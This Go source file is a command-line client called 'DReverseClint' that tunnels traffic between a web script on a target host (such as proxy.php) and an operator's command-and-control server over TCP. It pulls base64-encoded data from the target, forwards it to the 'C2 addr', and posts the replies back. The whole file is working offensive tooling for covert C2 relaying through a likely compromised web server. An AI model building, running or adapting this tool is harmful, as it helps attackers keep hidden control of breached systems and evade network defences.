package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/urfave/cli"
)

var (
	addr   string
	target string
)

// 获取数据模块
func GetDate(cli *cli.Context) {
	url := cli.String("target")
	hostPort := cli.String("addr")
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		panic(err)
	}
	content, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if string(content[:15]) == "CONNECT SUCCESS" {
		fmt.Println(string(content[:15]), "Start getting data ....")
		for {
			dataResp, err := client.Post(url, "application/x-www-form-urlencoded", strings.NewReader("DataType=GetData"))
			if err != nil {
				panic(err)
			}
			data, _ := ioutil.ReadAll(dataResp.Body)
			dataResp.Body.Close()
			if string(data) == "NO DATA" || len(data) == 0 {
				continue
			}
			data, _ = base64.URLEncoding.DecodeString(string(data))
			fmt.Println("获取的数据")
			fmt.Println(len(data))
			fmt.Println(data)
			SendDate(hostPort, data, url)
		}
	} else {
		fmt.Println("Please check if the script exists and runs...")
	}
}

var dataBuf = make([]byte, 0, 1046616)

// 数据发送模块
func SendDate(hostPort string, data []byte, url string) {
	conn, err := net.Dial("tcp", hostPort)
	defer conn.Close()
	if err != nil {
		fmt.Printf("connect failed, err : %v\n", err.Error())
		return
	}
	// b64Data, _ := base64.URLEncoding.DecodeString(data)
	// base64.URLEncoding.EncodeToString()
	// fmt.Println("Send data to C2:")
	// fmt.Println("--------------------------------------------------------------")
	// fmt.Println(string(data))
	// fmt.Println("--------------------------------------------------------------")

	_, err = conn.Write(data)
	if err != nil {
		fmt.Printf("write failed , err : %v\n", err)
	}
	for {
		tmp := make([]byte, 1046616)
		dataErr := conn.SetDeadline(time.Now().Add(1 * time.Second))
		if dataErr != nil {
			fmt.Println("End of getting data")
			break
		}
		C2data, err := conn.Read(tmp)
		dataBuf = append(dataBuf, tmp[:C2data]...)
		if err != nil {
			if err != io.EOF {
				fmt.Println("read error:", err)
				break
			}
		}
		if C2data == 0 {
			// fmt.Println("Get data from C2")
			// fmt.Println(C2data)
			fmt.Println("发送的数据")
			fmt.Println(string(dataBuf))
			C2Send := []byte("DataType=PostData&Data=TO:SEND" + base64.URLEncoding.EncodeToString(dataBuf))
			client := &http.Client{Timeout: 5 * time.Second}
			resp, err := client.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer(C2Send))
			if err != nil {
				panic(err)
			}
			resp.Body.Close()
			dataBuf = append(dataBuf[:0])
			fmt.Println("End of getting data")
			// conn.Close()
			break
		}
		// fmt.Println("Get data from C2")
		// fmt.Println(C2data)
		// fmt.Println("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
		// fmt.Println("发送的数据")
		// fmt.Println(string(tmp[:C2data]))
		// fmt.Println("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
		// fmt.Println(len(base64.URLEncoding.EncodeToString(tmp[:C2data])))
		// fmt.Println(base64.URLEncoding.EncodeToString(tmp[:C2data]))

		// conn.Close()
		// phpdata, _ := ioutil.ReadAll(resp.Body)
		// fmt.Println("xxx")
		// fmt.Println(len(string(phpdata)))
		// fmt.Println("Send to shell ok!")
		// time.Sleep(1 * time.Second)
		// break
	}

}

// 主函数
func main() {
	app := cli.NewApp()
	app.Name = "DReverseClint"
	app.Usage = "A ReverseProxy tools"
	app.Version = "0.0.1 dev"
	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:        "addr",
			Value:       "",
			Usage:       "C2 addr like 127.0.0.1:8881",
			Destination: &addr,
		},
		cli.StringFlag{
			Name:        "target",
			Value:       "",
			Usage:       "target url like http://example.com/proxy.php",
			Destination: &target,
		},
	}
	app.Action = GetDate
	app.Run(os.Args)
}
